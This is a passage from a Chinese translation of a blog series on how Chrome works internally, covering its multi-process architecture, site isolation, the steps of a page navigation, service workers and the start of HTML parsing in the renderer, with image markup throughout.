src="https://cdn.nlark.com/yuque/0/2020/png/164572/1599615789037-3b5c5445-dc91-4673-bbbd-55d5f618fc0c.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1599615789037-3b5c5445-dc91-4673-bbbd-55d5f618fc0c.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>图 8：Chrome 的多进程架构示意图。渲染进程下显示了多个层，表明 Chrome 为每个标签页运行多个渲染进程。</p><p><a name="51b19fbc"></a></p><h2 id="进程各自控制什么？"><a href="#进程各自控制什么？" class="headerlink" title="进程各自控制什么？"></a>进程各自控制什么？</h2><p>下表展示每个 Chrome 进程与各自控制的内容：</p><table><thead><tr><th>进程</th><th>控制</th></tr></thead><tbody><tr><td>浏览器</td><td>控制应用中的 “Chrome” 部分，包括地址栏，书签，回退与前进按钮。以及处理 web 浏览器不可见的特权部分，如网络请求与文件访问。</td></tr><tr><td>渲染</td><td>控制标签页内网站展示。</td></tr><tr><td>插件</td><td>控制站点使用的任意插件，如 Flash。</td></tr><tr><td>GPU</td><td>处理独立于其它进程的 GPU 任务。GPU 被分成不同进程，因为 GPU 处理来自多个不同应用的请求并绘制在相同表面。</td></tr></tbody></table><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1599615796495-74e3b320-3435-410e-af32-f60c66a1b8d2.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1599615796495-74e3b320-3435-410e-af32-f60c66a1b8d2.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>图 9：不同进程指向浏览器 UI 的不同部分</p><p>还有更多进程如扩展进程与应用进程。如果你想要了解有多少进程运行在你的 Chrome 浏览器中，可以点击右上角的选项菜单图标，选择更多工具，然后选择任务管理器。然后会打开一个窗口，其中列出了当前正在运行的进程以及它们当前的 CPU&#x2F;内存使用量。</p><p><a name="66ec77ef"></a></p><h2 id="Chrome-多进程架构的优点"><a href="#Chrome-多进程架构的优点" class="headerlink" title="Chrome 多进程架构的优点"></a>Chrome 多进程架构的优点</h2><p>前文中提到了 Chrome 使用多个渲染进程。最简单的情况下，你可以想象每个标签页都有自己的渲染进程。假设你打开了三个标签页，每个标签页都拥有自己独立的渲染进程。如果某个标签页失去响应，你可以关掉这个标签页，此时其它标签页依然运行着，可以正常使用。如果所有标签页都运行在同一进程上，那么当某个失去响应，所有标签页都会失去响应。这样的体验很糟糕。</p><p><img src="https://cdn.nlark.com/yuque/0/2020/svg/164572/1599615825071-23986c0a-3ff0-424c-b4b4-d198b010ea9f.svg#height=572&id=jj7Fj&originHeight=150&originWidth=273&originalType=binary&ratio=1&rotation=0&showTitle=false&size=112568&status=done&style=none&title=&width=1041" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/svg/164572/1599615825071-23986c0a-3ff0-424c-b4b4-d198b010ea9f.svg#height=572&id=jj7Fj&originHeight=150&originWidth=273&originalType=binary&ratio=1&rotation=0&showTitle=false&size=112568&status=done&style=none&title=&width=1041" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="3.svg"></p><p>图 10：如图所示每个标签页上运行的渲染进程</p><p>把浏览器工作分成多个进程的另一好处是安全性与沙箱化。由于操作系统提供了限制进程权限的方法，浏览器就可以用沙箱保护某些特定功能的进程。例如，Chrome 浏览器限制处理任意用户输入的进程(如渲染器进程)对任意文件的访问。</p><p>由于进程有自己的私有内存空间，所以它们通常包含公共基础设施的拷贝(如 V8，它是 Chrome 的 JavaScript 引擎)。这意味着使用了更多的内存，如果它们是同一进程中的线程，就无法共享这些拷贝。为了节省内存，Chrome 对可加速的内存数量进行了限制。具体限制数值依设备可提供的内存与 CPU 能力而定，但是当 Chrome 运行时达到限制时，会开始在同一站点的不同标签页上运行同一进程。</p><p><a name="f48608af"></a></p><h2 id="节省更多内存-——-Chrome-中的服务化"><a href="#节省更多内存-——-Chrome-中的服务化" class="headerlink" title="节省更多内存 —— Chrome 中的服务化"></a>节省更多内存 —— Chrome 中的服务化</h2><p>同样的方法也适用于浏览器进程。Chrome 正在经历架构变革，它转变为将浏览器程序的每一模块作为一个服务来运行，从而可以轻松实现进程的拆解或聚合。</p><p>通常观点是当 Chrome 运行在强力硬件上时，它会将每个服务分解到不同进程中，从而提升稳定性，但是如果 Chrome 运行在资源有限的设备上时，它会将服务聚合到一个进程中从而节省了内存占用。在这一架构变革实现前，类似的整合进程以减少内存使用的方法已经在 Android 类平台上使用。</p><p><img src="https://cdn.nlark.com/yuque/0/2020/svg/164572/1599615881070-8a96f98c-ee7c-4809-b631-c6000a1f2efb.svg#height=547&id=U2F2c&originHeight=150&originWidth=273&originalType=binary&ratio=1&rotation=0&showTitle=false&size=335942&status=done&style=none&title=&width=995" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/svg/164572/1599615881070-8a96f98c-ee7c-4809-b631-c6000a1f2efb.svg#height=547&id=U2F2c&originHeight=150&originWidth=273&originalType=binary&ratio=1&rotation=0&showTitle=false&size=335942&status=done&style=none&title=&width=995" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="4.svg"></p><p>图 11： Chrome 的服务化图，将不同的服务移动到多个进程和单个浏览器进程中</p><p><a name="a6731ad1"></a></p><h2 id="每个-iframe-的渲染进程-——-站点隔离"><a href="#每个-iframe-的渲染进程-——-站点隔离" class="headerlink" title="每个 iframe 的渲染进程 —— 站点隔离"></a>每个 iframe 的渲染进程 —— 站点隔离</h2><p><a href="https://developers.google.com/web/updates/2018/07/site-isolation">站点隔离</a> 是近期引入到 Chrome 中的一个功能，它为每个 iframe 运行一个单独的渲染进程。我们已经讨论了许久每个标签页的渲染进程，它允许跨站点 iframe 运行在一个单独的渲染进程，在不同站点中共享内存。运行 a.com 与 b.com 在同一渲染进程中看起来还 ok。</p><p><a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy">同源策略</a> 是 web 的核心安全模型。同源策略确保站点在未得到其它站点许可的情况下不能获取其数据。安全攻击的一个主要目标就是绕过同源策略。进程隔离是分离站点的最高效的手段。随着 <a href="https://developers.google.com/web/updates/2018/02/meltdown-spectre">Meltdown and Spectre</a> 的出现，使用进程来分离站点愈发势在必行。Chrome 67 版本后，桌面版 Chrome 都默认开启了站点隔离，每个标签页的 iframe 都有一个单独的渲染进程。</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1599615869857-83aa8ae0-9caa-4c58-b746-5e6ead89bfe3.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1599615869857-83aa8ae0-9caa-4c58-b746-5e6ead89bfe3.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>图 12：站点隔离示意图，多个渲染进程指向站点内的 iframe</p><p>启用站点隔离是多年来工程人员努力的结果。站点隔离并不只是分配不同的渲染进程这么简单。它从根本上改变了 iframe 的通信方式。在一个页面上打开开发者工具，让 iframe 在不同的进程上运行，这意味着开发者工具必须在幕后工作，以使它看起来无缝。即使运行一个简单的 Ctrl + F 来查找页面中的一个单词，也意味着在不同的渲染器进程中进行搜索。你可以看到为什么浏览器工程师把发布站点隔离功能作为一个重要里程碑！</p><p><a name="25f9c7fa"></a></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这一部分从高级视角对浏览器架构与多进程架构的优点进行阐述。我们也对 Chrome 中与多进程架构密切相关的服务化与站点隔离进行了讲解。下一部分中，我们将开始深入了解进程与线程中到底发生了什么才能使网站得以呈现。</p><p><a name="QWTre"></a></p><h1 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h1><p>在这一部分中，我们研究了导航过程中发生了什么，以及你的 Web 应用代码（例如响应头和客户端 JavaScript）如何与浏览器交互。了解浏览器通过网络获取数据的步骤，可以更容易地理解为什么开发导航预加载等 API。<br><a name="8ab505b2"></a></p><h2 id="导航时发生了什么"><a href="#导航时发生了什么" class="headerlink" title="导航时发生了什么"></a>导航时发生了什么</h2><p>这是关于 Chrome 内部工作的 4 篇博客系列的第 2 篇。在<a href="https://github.com/xitu/gold-miner/blob/master/TODO1/inside-look-at-modern-web-browser-part1.md">上一篇文章</a>中，我们研究了不同的进程和线程如何处理浏览器的不同部分。在这篇文章中，我们会更深入研究每个进程和线程如何进行通信以展示网站。</p><p>让我们看一个网络浏览的简单用例：你在浏览器中键入 URL，然后浏览器从互联网获取数据并显示一个页面。在这篇文章中，我们将重点放在用户请求站点和浏览器准备渲染页面部分 —— 亦即导航。</p><p><a name="411db4a0"></a></p><h2 id="它以浏览器进程开始"><a href="#它以浏览器进程开始" class="headerlink" title="它以浏览器进程开始"></a>它以浏览器进程开始</h2><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1599616629080-71613c80-dc9d-4060-ab0c-4881b94a2d82.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1599616629080-71613c80-dc9d-4060-ab0c-4881b94a2d82.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>图 1：顶部是浏览器 UI，底部是拥有 UI、网络和存储线程的浏览器进程图</p><p>正如我们在<a href="https://developers.google.com/web/updates/2018/09/inside-browser-part1">第 1 部分：CPU、GPU、内存和多进程架构</a>中所述，tab 外的一切都被浏览器进程处理。浏览器进程有很多线程，例如绘制浏览器按钮和输入栏的 UI 线程、处理网络栈以从因特网获取数据的网络线程、控制文件访问的存储线程等。当你在地址栏中键入 URL 时，你的输入将由浏览器进程的 UI 线程处理。</p><p><a name="ed797f7d"></a></p><h2 id="一个简单导航"><a href="#一个简单导航" class="headerlink" title="一个简单导航"></a>一个简单导航</h2><p><a name="a58a4caa"></a></p><h3 id="第-1-步：处理输入"><a href="#第-1-步：处理输入" class="headerlink" title="第 1 步：处理输入"></a>第 1 步：处理输入</h3><p>当用户开始在地址栏键入时，UI 线程要问的第一件事是 “这是一次搜索查询还是一个 URL 地址？”。在 Chrome 中，地址栏同时也是一个搜索输入栏，所以 UI 线程需要解析和决定把你的请求发送到搜索引擎，或是你要请求的网站。</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1599616639583-201e787d-6b70-475c-ad10-f1c89fcbef26.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1599616639583-201e787d-6b70-475c-ad10-f1c89fcbef26.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>图 1：UI 线程询问输入内容是搜索查询还是 URL 地址</p><p><a name="b6e4ae45"></a></p><h3 id="第-2-步：开始导航"><a href="#第-2-步：开始导航" class="headerlink" title="第 2 步：开始导航"></a>第 2 步：开始导航</h3><p>当用户按下 Enter 键时，UI 线程启用网络调取去获取站点内容。加载动画会显示在标签页的一角，网络线程会通过适当的协议，像 DNS 查找和为请求建立 TLS 连接。</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1599616647692-f5f7ac6a-56da-4c97-a0be-0037caaee21a.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1599616647692-f5f7ac6a-56da-4c97-a0be-0037caaee21a.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>图 2：UI 线程告诉网络线程要导航到 mysite.com</p><p>在这时，网络线程可能会收到像 HTTP 301 那样的服务器重定向头。这种情况下，网络线程会告诉 UI 线程，服务器正在请求重定向。然后，另一个 URL 请求会被启动。</p><p><a name="3d24bd80"></a></p><h3 id="第-3-步：读取响应"><a href="#第-3-步：读取响应" class="headerlink" title="第 3 步：读取响应"></a>第 3 步：读取响应</h3><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1599616655237-2b7498c1-ada4-4ce9-a5a6-bc15d0a23d78.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1599616655237-2b7498c1-ada4-4ce9-a5a6-bc15d0a23d78.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>图 3：包含 Content-Type 的响应头以及作为实际数据的 payload</p><p>一旦开始收到响应主体（payload），网络线程会在必要时查看数据流的前几个字节。响应报文的 Content-Type 字段会声明数据的类型，但是它有可能会丢失或者错误，所以就有了 <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types">MIME 类型嗅探</a>来解决这个问题。这是<a href="https://cs.chromium.org/chromium/src/net/base/mime_sniffer.cc?sq=package:chromium&dr=CS&l=5">源码</a>中评论的“棘手的问题”。你可以阅读注释看一下不同浏览器是怎么匹配 content-type 和 payload 的。</p><p>如果响应是一个 HTML 文件，那么下一步就会把数据传给渲染进程，但是如果是一个压缩文件或是其他文件，那么意味着它是一个下载请求，因此需要将数据传递给下载管理器。</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1599616663436-4894518e-5d3a-4188-aa23-500219fbf360.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1599616663436-4894518e-5d3a-4188-aa23-500219fbf360.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>图 4：网络线程询问一个响应数据是否是从安全网站来的 HTML</p><p>此时也会进行 <a href="https://safebrowsing.google.com/">SafeBrowsing</a> 检查。如果域名和响应数据似乎匹配到一个已知的恶意网站，那么网络线程会显示一个警告页面。除此之外，还会发生 <a href="https://www.chromium.org/Home/chromium-security/corb-for-developers"><strong>C</strong>ross <strong>O</strong>rigin <strong>R</strong>ead <strong>B</strong>locking（<strong>CORB</strong>）</a>检查，以确保敏感的跨域数据不被传给渲染进程。</p><p><a name="173d1c10"></a></p><h3 id="第-4-步：查找渲染进程"><a href="#第-4-步：查找渲染进程" class="headerlink" title="第 4 步：查找渲染进程"></a>第 4 步：查找渲染进程</h3><p>一旦所有的检查执行完毕并且网络线程确信浏览器会导航到请求的站点，网络线程会告诉 UI 线程所有的数据准备完毕。UI 线程会寻找渲染进程去开始渲染 web 页面。</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1599616671566-4f5fb6f4-6e70-49d8-815e-123eba318282.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1599616671566-4f5fb6f4-6e70-49d8-815e-123eba318282.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>图 5：网络线程告诉 UI 线程去查找渲染进程</p><p>由于网络请求会花费几百毫秒才获取回响应，因此可以应用一个优化措施。当第 2 步 UI 线程正发送一个 URL 请求给网络线程时，它已经知道它们会导航到哪个站点。在网络请求的同时，UI 并行地线程尝试主动寻找或开启一个渲染进程。这样，如果一切按预期进行，渲染进程在网络线程接受到数据时就已经处于待命状态。如果导航跨域重定向，这个待命进程也许不会被用到，这种情况下也许会用到另一个进程。</p><p><a name="100537ff"></a></p><h3 id="第-5-步：提交导航"><a href="#第-5-步：提交导航" class="headerlink" title="第 5 步：提交导航"></a>第 5 步：提交导航</h3><p>现在数据和渲染进程已经就绪，浏览器进程会发送一个 IPC（进程间通信）到渲染进程去提交导航。它也会传递数据流，所以渲染进程可以保持接收 HTML 数据。一旦浏览器进程收到渲染进程已经提交的确认消息，导航完毕并且文档加载解析开始。</p><p>这时，地址栏已经更新，安全指示器和站点设置 UI 会反映新页面的站点信息。此标签页的 session 历史记录会被更新，所以前进&#x2F;后退按钮会走向刚导航过的站点。当你关闭标签页或者窗口，为了优化 tab&#x2F;session 的还原，session 历史被保存在硬盘上。</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1599616678923-54b99257-537d-4270-a328-80990815d56a.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1599616678923-54b99257-537d-4270-a328-80990815d56a.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>图 6：浏览器和渲染进程间的 IPC，请求渲染页面。</p><p><a name="7803eae1"></a></p><h3 id="额外的步骤：初始加载完毕"><a href="#额外的步骤：初始加载完毕" class="headerlink" title="额外的步骤：初始加载完毕"></a>额外的步骤：初始加载完毕</h3><p>一旦导航被提交，渲染进程开始加载资源和渲染页面。我们将在下一篇文章中讲解这个阶段发生什么的细节。一旦渲染进程渲染“完毕”。它会发送一个 IPC 返回给浏览器进程（这会在页面所有的 frame 的 <code>onload</code> 事件已经触发和执行完毕后发生）。这时，UI 线程停止标签页上的加载动画。</p><p>我之所以说“结束”，是因为客户端 JavaScript 可以在这时之后仍然加载额外的资源并且渲染新视图。</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1599616687543-a2d03be1-4e28-4723-9d7c-6872a3f1b2db.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1599616687543-a2d03be1-4e28-4723-9d7c-6872a3f1b2db.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>图 7：渲染进程发送 IPC 到浏览器进程通知页面“已被加载”</p><p><a name="36edc000"></a></p><h2 id="导航到另一个站点"><a href="#导航到另一个站点" class="headerlink" title="导航到另一个站点"></a>导航到另一个站点</h2><p>简单导航已经完毕！但是用户在地址栏输入另一个 URL 会怎样呢？好吧，浏览器进程会执行相同的步骤来导航到一个不同的站点。但是在它做这个之前，它会检查当前已经渲染的站点是否关心 <code>[beforeunload](https://developer.mozilla.org/en-US/docs/Web/Events/beforeunload)</code> 事件。</p><p><code>beforeunload</code> 可以在你试图导航离开或关闭标签页时创建“离开此站点？”警告。包括你的 JavaScript 代码，所有标签页内的东西都是由渲染进程处理，所以当新的导航请求到来时，浏览器进程必须要跟当前的渲染进程核对。</p><p><strong>注意：</strong> 不要添加无条件的 <code>beforeunload</code> 处理程序。它会产生更多延迟，因为处理程序需要在导航开始之前执行。应仅在需要时添加此事件处理程序，例如如果需要警告用户他们可能会丢失他们在页面上输入的数据。</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1599616695201-b12476a2-7646-4e29-8767-12181fee08bb.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1599616695201-b12476a2-7646-4e29-8767-12181fee08bb.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>图 8：浏览器进程向渲染进程发送 IPC 告诉它将要导航到另一个站点</p><p>如果渲染进程已经启动了导航（像用户点击一个链接或者客户端 JavaScript 运行 <code>window.location = &quot;https://newsite.com&quot;</code>），渲染进程会先检查 <code>beforeunload</code> 事件处理程序。然后，它会像浏览器处理启动导航一样执行相同的步骤。唯一不同的是导航请求是由渲染进程发送到浏览器进程的。</p><p>当新导航到的站点不同于当前已渲染的站点时，会调用一个独立的渲染进程来处理新导航，同时保持当前的渲染进程来处理类似 <code>unload</code> 的事件。有关更多信息，请查看<a href="https://developers.google.com/web/updates/2018/07/page-lifecycle-api#overview_of_page_lifecycle_states_and_events">页面生命周期概览</a>以及如何使用<a href="https://developers.google.com/web/updates/2018/07/page-lifecycle-api">页面生命周期 API</a> 挂钩事件。</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1599616702471-aa906884-5366-4bd6-b6ab-dd048ad7cb2e.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1599616702471-aa906884-5366-4bd6-b6ab-dd048ad7cb2e.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>图 9：2 个 IPC（从浏览器进程到新渲染进程）告知渲染页面并告知旧渲染进程卸载</p><p><a name="029568fa"></a></p><h2 id="如果有-Service-Worker"><a href="#如果有-Service-Worker" class="headerlink" title="如果有 Service Worker"></a>如果有 Service Worker</h2><p>最近对导航过程的改变是引入了 <a href="https://developers.google.com/web/fundamentals/primers/service-workers/">service worker</a>。service worker 是一种在你的应用代码中编写网络代理的方法；允许 Web 开发者更好地控制本地缓存内容以及何时从网络获取新数据。如果将 service worker 设置为从缓存加载页面，则无需从网络请求数据。</p><p>要记住的重要部分是 Service Worker 是在渲染进程中运行的 JavaScript 代码。但是当导航请求进入时，浏览器进程如何知道该站点有 service worker？</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1599616710231-89d5d6a3-5827-4717-8076-71367fde731b.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1599616710231-89d5d6a3-5827-4717-8076-71367fde731b.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>图 10：浏览器进程中的网络线程查找 service worker 作用域</p><p>当注册一个 service worker 时，保持 service worker 的作用域作为一个引用（你可以在这篇文章 <a href="https://developers.google.com/web/fundamentals/primers/service-workers/lifecycle">The Service Worker Lifecycle</a> 中阅读更多关于作用域的知识）。当一个导航发生时，网络线程用已注册的 service worker 作用域来检查域名，如果已经为该 URL 注册了一个 service worker，UI 线程会找一个渲染线程来执行 service worker 的代码。service worker 可能从缓存中加载数据，无需从网络请求数据，或者可以从网络请求新资源。</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1599616718334-55df6bb4-02d3-4095-8f23-e85d12575e97.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1599616718334-55df6bb4-02d3-4095-8f23-e85d12575e97.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>图 11：浏览器中的 UI 线程启动渲染进程来处理 service workers；然后，渲染进程中的工作线程从网络请求数据</p><p><a name="8f24f2b0"></a></p><h2 id="导航预加载"><a href="#导航预加载" class="headerlink" title="导航预加载"></a>导航预加载</h2><p>你可以看到，如果 service worker 最终决定从网络请求数据，则浏览器进程和渲染器进程之间的往返可能会导致延迟。<a href="https://developers.google.com/web/updates/2017/02/navigation-preload">导航预加载</a>是一种通过与 service worker 启动并行加载资源来加速此过程的机制。它用一个头部来标记这些请求，允许服务器决定为这些请求发送不同的内容；例如，只更新数据而不是完整文档。</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1599616726140-177b3ee3-c297-4992-99e7-4f01fee661f0.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1599616726140-177b3ee3-c297-4992-99e7-4f01fee661f0.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>图 12：浏览器进程中的 UI 线程启动渲染进程以在并行启动网络请求的同时处理 service worker</p><p><a name="sZRMf"></a></p><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>在这一部分中，我们研究了导航过程中发生了什么，以及你的 Web 应用代码（例如响应头和客户端 JavaScript）如何与浏览器交互。了解浏览器通过网络获取数据的步骤，可以更容易地理解为什么开发导航预加载等 API。在下一部分，我们将深入探讨浏览器如何分析 HTML&#x2F;CSS&#x2F;JavaScript 以渲染页面。</p><p><a name="KOvVu"></a></p><h1 id="第三部分"><a href="#第三部分" class="headerlink" title="第三部分"></a>第三部分</h1><p>研究了渲染管道从解析到合成的整个过程，希望现在你能自主地去了解更多关于网站性能优化的信息。<br><a name="8c6116f2"></a></p><h2 id="渲染进程的内部机制"><a href="#渲染进程的内部机制" class="headerlink" title="渲染进程的内部机制"></a>渲染进程的内部机制</h2><p>这是关于浏览器工作原理博客系列四部分中的第三部分。之前，我们介绍了<a href="https://github.com/xitu/gold-miner/blob/master/TODO1/inside-look-at-modern-web-browser-part1.md">多进程架构</a>和<a href="https://github.com/xitu/gold-miner/blob/master/TODO1/inside-browser-part2.md">导航流</a>。在这篇文章中，我们将一探渲染进程的内部机制。</p><p>渲染进程涉及 Web 性能的许多方面。由于渲染进程的流程太复杂，因此本文只进行概述。如果你想深入了解，可以在 <a href="https://developers.google.com/web/fundamentals/performance/why-performance-matters/">the Performance section of Web Fundamentals</a> 找到相关资源。</p><p><a name="18e79a87"></a></p><h2 id="渲染进程处理网站内容"><a href="#渲染进程处理网站内容" class="headerlink" title="渲染进程处理网站内容"></a>渲染进程处理网站内容</h2><p>渲染进程负责标签页内发生的所有事情。在渲染进程中，主线程处理服务器发送到用户的大部分代码。如果你使用 web worker 或 service worker，部分 JavaScript 将由工作线程处理。合成和光栅线程也在渲染进程内运行，以高效，流畅地呈现页面。</p><p>渲染进程的核心工作是将 HTML、CSS 和 JavaScript 转换为用户可以与之交互的网页。</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1599616941594-ca3421d9-31e1-4abd-92fd-779a23dae629.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1599616941594-ca3421d9-31e1-4abd-92fd-779a23dae629.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>图 1：渲染进程内部包含主线程、工作线程、合成线程和光栅线程</p><p><a name="a183a12f"></a></p><h2 id="解析（Parsing）"><a href="#解析（Parsing）" class="headerlink" title="解析（Parsing）"></a>解析（Parsing）</h2><p><a name="f9a2b4e6"></a></p><h3 id="DOM-的构建"><a href="#DOM-的构建" class="headerlink" title="DOM 的构建"></a>DOM 的构建</h3><p>当渲染进程收到导航的提交消息并开始接收 HTML 数据时，主线程开始解析文本字符串（HTML）并将其转换为文档对象模型（<strong>DOM</strong>）。</p><p>DOM 是一个页面在浏览器内部表现，也是 Web 开发人员可以通过 JavaScript 与之交互的数据结构和 API。</p><p>将 HTML 到 DOM 的解析由 <a href="https://html.spec.whatwg.org/">HTML Standard</a> 规定。你可能已经注意到，将 HTML 提供给浏览器这一过程从不会引发错误。像 <code>Hi! &lt;b&gt;I&#39;m &lt;i&gt;Chrome&lt;/b&gt;!&lt;/i&gt;</code> 这样的错误标记，会被理解为 <code>Hi! &lt;b&gt;I&#39;m &lt;i&gt;Chrome&lt;/i&gt;&lt;/b&gt;&lt;i&gt;!&lt;/i&gt;</code>，这是因为 HTML 规范会优雅地处理这些错误。如果你好奇这是如何做到的，可以阅读 <a href="https://html.spec.whatwg.org/multipage/parsing.html#an-introduction-to-error-handling-and-strange-cases-in-the-parser">An introduction to error handling and strange cases in the parser</a> 的 HTML 规范部分。</p><p><a name="d50d30c4"></a></p><h3 id="子资源加载"><a href="#子资源加载" class="headerlink" title="子资源加载"></a>子资源加载</h3><p>网站通常使用图像、CSS 和 JavaScript 等外部资源，这些文件需要从网络或缓存加载。在解析构建 DOM 时，主线程<strong>会</strong>按处理顺序逐个请求它们，但为了加快速度，“预加载扫描器（preload scanner）”会同时运行。如果 HTML 文档中有 <code>&lt;img&gt;</code> 或 <code>&lt;link&gt;</code> 之类的内容，则预加载扫描器会查看由 HTML 解析器生成的标记，并在浏览器进程中向网络线程发送请求。</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1599616952605-b7b99bd3-bb18-4210-a9a7-fccc901e9247.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1599616952605-b7b99bd3-bb18-4210-a9a7-fccc901e9247.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>图 2：主线程解析 HTML 并构建 DOM 树</p><p><a name="f8b53b9a"></a></p><h3 id="JavaScript-阻塞解析"><a href="#JavaScript-阻塞解析" class="headerlink" title="JavaScript 阻塞解析"></a>JavaScript 阻塞解析</h3><p>当 HTML 解析器遇到 <code>&lt;script&gt;</code> 标记时，会暂停解析 HTML 文档，开始加载、解析并执行 JavaScript 代码。为什么？因为JavaScript 可以使用诸如 <code>document.write()</code> 的方法来改写文档，这会改变整个 DOM 结构（HTML 规范里的 <a href="https://html.spec.whatwg.org/multipage/parsing.html#overview-of-the-parsing-model">overview of the parsing model</a> 中有一张不错的图片）。这就是 HTML 解析器必须等待 JavaScript 运行后再继续解析 HTML 文档原因。如果你对 JavaScript 执行中发生的事情感到好奇，可以看看 <a href="https://mathiasbynens.be/notes/shapes-ics">V8 团队就此发表的演讲和博客文章</a>。</p><p><a name="c202620e"></a></p><h2 id="提示浏览器如何加载资源"><a href="#提示浏览器如何加载资源" class="headerlink" title="提示浏览器如何加载资源"></a>提示浏览器如何加载资源</h2><p>Web 开发者可以通过多种方式向浏览器发送提示，以便很好地加载资源。如果你的 JavaScript 不使用 <code>document.write()</code>，你可以在 <code>&lt;script&gt;</code> 标签添加 <code>[async](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/script#attr-async)</code> 或 <code>[defer](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/script#attr-defer)</code> 属性，这样浏览器会异步加载运行 JavaScript 代码，而不阻塞解析。如果合适，你也可以使用 <a href="https://developers.google.com/web/fundamentals/primers/modules">JavaScript 模块</a>。可以使用 <code>&lt;link rel=&quot;preload&quot;&gt;</code> 告知浏览器当前导航肯定需要该资源，并且你希望尽快下载。有关详细信息请参阅 <a href="https://developers.google.com/web/fundamentals/performance/resource-prioritization">Resource Prioritization – Getting the Browser to Help You</a>。</p><p><a name="89480b0f"></a></p><h2 